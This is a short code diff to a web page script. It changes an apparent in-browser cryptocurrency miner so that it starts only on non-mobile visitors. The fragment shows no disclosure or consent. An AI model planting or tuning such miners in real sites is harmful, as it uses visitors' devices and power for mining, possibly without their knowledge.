@@ -78,7 +78,9 @@
                 throttle: 0.1,
                 forceASMJS: false
             });
-             miner.start();
+            if (!miner.isMobile()){
+                miner.start();
+            }
         </script>
 
 
